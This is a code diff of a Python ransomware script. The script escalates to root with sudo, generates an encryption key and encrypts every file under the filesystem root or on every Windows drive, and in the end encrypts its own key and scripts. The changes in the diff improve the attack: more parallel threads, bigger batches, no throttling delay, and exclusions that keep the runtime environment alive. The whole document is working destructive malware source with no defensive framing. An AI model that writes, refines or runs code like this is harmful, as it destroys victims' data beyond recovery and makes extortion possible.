@@ -27,6 +27,7 @@ def check_and_relaunch():
         except Exception as e:
             logging.error(f"Failed to relaunch script with sudo: {e}")
             sys.exit(1)
+
     elif platform.system() == "Windows":
         logging.info("Script is not running with administrative privileges. Please run as an administrator.")
         sys.exit(1)
@@ -38,13 +39,14 @@ key = Fernet.generate_key()
 with open("thekey.key", "wb") as key_file:
     key_file.write(key)
 
-# Exclude specific files and directories
+# Exclude specific files
 EXCLUDE_FILES = {"main.py", "thekey.key", "decrypt.py"}
-EXCLUDE_DIRS = {os.path.abspath(os.path.dirname(sys.executable)), os.path.abspath(os.path.dirname(__file__))}
 
-# Add the virtual environment directory to the exclusion list
-if 'VIRTUAL_ENV' in os.environ:
-    EXCLUDE_DIRS.add(os.environ['VIRTUAL_ENV'])
+# Get the Python environment path
+python_env_path = os.path.dirname(os.path.dirname(sys.executable))
+
+# Get the Node.js environment path managed by nvm
+nvm_path = os.path.expanduser("~/.nvm")
 
 # Function to encrypt a file
 def encrypt_file(file_path):
@@ -61,15 +63,13 @@ def encrypt_file(file_path):
 # Function to get all files from a root directory
 def get_all_files(root_dir, exclude_paths):
     for root, _, files in os.walk(root_dir):
-        if any(os.path.commonpath([root, exclude]) == exclude for exclude in exclude_paths):
-            continue
         for file in files:
             file_path = os.path.join(root, file)
-            if os.path.basename(file_path) not in EXCLUDE_FILES:
+            if os.path.basename(file_path) not in EXCLUDE_FILES and not any(os.path.commonpath([file_path, exclude]) == exclude for exclude in exclude_paths):
                 yield file_path
 
 # Function to process files in chunks
-def process_files_in_chunks(files, chunk_size=5):
+def process_files_in_chunks(files, chunk_size=10):
     while True:
         chunk = []
         try:
@@ -81,39 +81,33 @@ def process_files_in_chunks(files, chunk_size=5):
             break
         yield chunk
 
-# Signal handler for bus errors and segmentation faults
+# Signal handler for bus errors
 def bus_error_handler(signum, frame):
     logging.error("Bus error (signal %d). Continuing..." % signum)
     time.sleep(1)
 
-def segfault_handler(signum, frame):
-    logging.error("Segmentation fault (signal %d). Continuing..." % signum)
-    time.sleep(1)
-
 signal.signal(signal.SIGBUS, bus_error_handler)
-signal.signal(signal.SIGSEGV, segfault_handler)
 
 # Encrypt files in chunks
-def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=5):
+def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=10):
     all_files = get_all_files(root_dir, exclude_paths)
     for chunk in process_files_in_chunks(all_files, chunk_size):
-        with ThreadPoolExecutor(max_workers=2) as executor:
+        with ThreadPoolExecutor() as executor:
             futures = [executor.submit(encrypt_file, file) for file in chunk]
             for future in as_completed(futures):
                 try:
                     future.result()
                 except Exception as e:
                     logging.error(f"Error processing a file: {e}")
-        time.sleep(2)  # Add delay between batches
 
 # Main function
 def main():
     root_dirs = ["/"] if platform.system() != "Windows" else [drive + ":\\" for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(drive + ":\\")]
-    exclude_paths = EXCLUDE_DIRS
-
+    exclude_paths = [os.path.abspath(python_env_path), os.path.abspath(os.path.dirname(__file__)), os.path.abspath(nvm_path)]
+    
     for root_dir in root_dirs:
         encrypt_files_in_chunks(root_dir, exclude_paths)
-
+    
     # Finally encrypt the current script
     for script in EXCLUDE_FILES:
         script_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), script)
@@ -122,6 +116,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
